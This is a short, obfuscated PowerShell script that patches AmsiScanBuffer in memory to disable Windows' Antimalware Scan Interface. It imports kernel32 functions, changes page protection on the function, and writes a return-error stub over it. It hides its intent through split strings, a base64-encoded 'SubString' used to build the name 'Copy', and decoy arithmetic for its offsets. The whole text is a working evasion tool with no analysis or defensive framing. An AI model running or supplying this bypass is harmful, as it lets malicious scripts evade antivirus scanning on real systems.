$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $Win32
$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$FloatBoolean = "UwB1AGIAUwB0AHIAaQBuAGcA"
$AddressGet = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($AddressGet, [uint32]5, 0x40, [ref]$p)
$PatchBinary = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
start-sleep -s 5
$MemSpace = 56-456
$IntegerCalc = 58+678
$Win64 = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($FloatBoolean))
$LoadPatch = "System.Runtime.InteropServices"
$Init = "public class Win32"
$Module = "[Win32]::LoadLibrary"
$BuildPatch = $Init.$Win64(7,1) + $LoadPatch.$Win64(20,2) + $Module.$Win64(19,1)
[System.Runtime.InteropServices.Marshal]::$BuildPatch($PatchBinary, $MemSpace+400, $AddressGet, $IntegerCalc-730)
